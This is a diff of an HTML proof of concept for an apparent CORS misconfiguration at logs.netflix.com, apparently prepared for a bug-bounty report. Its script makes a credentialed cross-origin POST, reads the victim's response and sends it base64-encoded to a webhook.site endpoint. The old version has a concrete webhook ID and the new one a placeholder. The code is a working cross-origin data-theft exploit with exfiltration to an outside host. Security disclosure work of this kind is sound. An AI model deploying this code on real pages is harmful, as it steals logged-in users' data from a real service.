@@ -1,19 +1,33 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <body>
-<h2>Netflix CORS PoC</h2>
-
+<h3>Netflix CORS PoC – logs.netflix.com/log/www/cl/2</h3>
 <script>
 (async () => {
+  // --- payload copied from legit Netflix request, stripped for brevity ---
+  const body = {
+    currentState: {
+      1: {
+        source: "nrdp",
+        schema: { name: "netflixApp", version: "1.744.0" },
+        properties: { sequence: 1, time: 0 }
+      }
+    }
+  };
+
+  // exploit
   const res = await fetch("https://logs.netflix.com/log/www/cl/2", {
     method: "POST",
     credentials: "include",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ event: "cors‑pwn", ts: Date.now() })
+    body: JSON.stringify(body)
   });
-  const text = await res.text();
-  await fetch("https://webhook.site/4e1148e7-6ade-4b05-86c9-fd4e86d6e8be",
-              { method: "POST", body: btoa(text) });
+
+  const txt = await res.text();          // readable because of mis‑CORS
+  console.log("[PoC] response length:", txt.length);
+
+  // exfil to tester’s endpoint (triage can watch here)
+  await fetch("https://webhook.site/YOUR-UUID", { method:"POST", body: btoa(txt) });
 })();
 </script>
 </body>
